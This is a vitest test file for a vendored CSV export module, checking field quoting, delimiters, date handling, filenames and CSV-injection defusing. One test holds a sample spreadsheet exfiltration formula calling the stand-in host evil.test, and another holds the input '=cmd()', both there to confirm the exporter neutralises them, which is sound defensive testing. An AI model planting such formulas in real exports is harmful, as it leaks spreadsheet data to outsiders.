/**
 * VENDORED from retoken (`src/lib/table/csv.test.ts`) alongside the module it
 * covers — only the import paths changed. Keeping the upstream tests is the
 * point of copying a tested module rather than re-writing one.
 */
import { describe, expect, it } from 'vitest';
import { csvField, csvFilename, toCsv, UTF8_BOM } from '../src/lib/table/csv';
import { normalizeSchema, type TableSchema } from '../src/lib/table/types';

const SCHEMA: TableSchema = {
  name: 'str',
  age: 'int',
  premium: 'boolean',
  joined: 'date',
  mrr: { type: 'currency', currency: 'USD', label: 'MRR' },
};
const columns = normalizeSchema(SCHEMA);

const ROWS = [
  { name: 'Ada Lovelace', age: 36, premium: true, joined: '2021-03-04', mrr: 1299 },
  { name: 'Grace Hopper', age: 45, premium: false, joined: '2019-11-20', mrr: 0 },
];

describe('csvField', () => {
  it('leaves a plain value alone', () => {
    expect(csvField('Ada')).toBe('Ada');
  });

  it('quotes fields containing the delimiter', () => {
    expect(csvField('Lovelace, Ada')).toBe('"Lovelace, Ada"');
    expect(csvField('a;b', ';')).toBe('"a;b"');
    expect(csvField('a;b', ',')).toBe('a;b');
  });

  it('quotes and doubles embedded quotes', () => {
    expect(csvField('say "hi"')).toBe('"say ""hi"""');
  });

  it('quotes fields containing newlines', () => {
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
  });

  it('quotes fields with leading or trailing spaces, which parsers eat', () => {
    expect(csvField('  padded  ')).toBe('"  padded  "');
  });

  it('defuses cells a spreadsheet would run as a formula', () => {
    expect(csvField('=1+1')).toBe("'=1+1");
    expect(csvField('+44 20 7946')).toBe("'+44 20 7946");
    expect(csvField('-5')).toBe("'-5");
    expect(csvField('@handle')).toBe("'@handle");
    // The classic exfiltration payload must not survive unprefixed.
    expect(csvField('=HYPERLINK("http://evil.test?x="&A1)')).toMatch(/^"?'=HYPERLINK/);
  });

  it('does not defuse an ordinary negative number when asked not to', () => {
    expect(csvField('-5', ',', false)).toBe('-5');
  });

  it('quotes a defused field that also needs quoting', () => {
    expect(csvField('=a,b')).toBe('"\'=a,b"');
  });

  it('handles an empty field', () => {
    expect(csvField('')).toBe('');
  });
});

describe('toCsv', () => {
  it('writes a header of column labels', () => {
    const csv = toCsv([], columns);
    expect(csv).toBe('Name,Age,Premium,Joined,MRR');
  });

  it('can omit the header', () => {
    expect(toCsv([], columns, { header: false })).toBe('');
  });

  it('writes raw values by default, so it re-imports cleanly', () => {
    const csv = toCsv(ROWS, columns);
    expect(csv.split('\r\n')[1]).toBe('Ada Lovelace,36,true,2021-03-04,1299');
  });

  it('writes displayed text when asked', () => {
    const csv = toCsv(ROWS, columns, { formatted: true, locale: 'en-US' });
    expect(csv.split('\r\n')[1]).toBe('Ada Lovelace,36,Yes,3/4/2021,"$1,299.00"');
  });

  it('uses CRLF, which is what RFC 4180 and Excel expect', () => {
    expect(toCsv(ROWS, columns)).toContain('\r\n');
  });

  it('takes another delimiter, for TSV', () => {
    const tsv = toCsv(ROWS, columns, { delimiter: '\t' });
    expect(tsv.split('\r\n')[1]).toBe('Ada Lovelace\t36\ttrue\t2021-03-04\t1299');
  });

  it('exports Date objects as ISO, not as prose', () => {
    const [column] = normalizeSchema({ when: 'datetime' });
    const csv = toCsv([{ when: new Date('2021-03-04T05:06:07Z') }], [column!], { header: false });
    expect(csv).toBe('2021-03-04T05:06:07.000Z');
  });

  it('leaves an invalid date empty rather than writing garbage', () => {
    const [column] = normalizeSchema({ when: 'datetime' });
    expect(toCsv([{ when: new Date('nope') }], [column!], { header: false })).toBe('');
  });

  it('writes empty cells for missing values', () => {
    const csv = toCsv([{ name: 'Ada' }], columns, { header: false });
    expect(csv).toBe('Ada,,,,');
  });

  it('only writes the columns it is given', () => {
    const csv = toCsv(ROWS, [columns[0]!], { header: false });
    expect(csv).toBe('Ada Lovelace\r\nGrace Hopper');
  });

  it('escapes a value containing the delimiter', () => {
    const csv = toCsv([{ name: 'Lovelace, Ada' }], [columns[0]!], { header: false });
    expect(csv).toBe('"Lovelace, Ada"');
  });

  it('defuses formula-shaped data by default', () => {
    const csv = toCsv([{ name: '=cmd()' }], [columns[0]!], { header: false });
    expect(csv).toBe("'=cmd()");
  });
});

describe('csvFilename', () => {
  it('makes a safe stem from a caption', () => {
    expect(csvFilename('Q4 Report!')).toBe('q4-report.csv');
    expect(csvFilename('customers')).toBe('customers.csv');
  });

  it('falls back rather than producing a bare extension', () => {
    expect(csvFilename('!!!')).toBe('table.csv');
    expect(csvFilename('')).toBe('table.csv');
  });

  it('takes another extension', () => {
    expect(csvFilename('data', '.tsv')).toBe('data.tsv');
  });
});

describe('UTF8_BOM', () => {
  it('is the byte-order mark Excel needs to read UTF-8', () => {
    expect(UTF8_BOM).toBe('﻿');
    expect(UTF8_BOM).toHaveLength(1);
  });
});
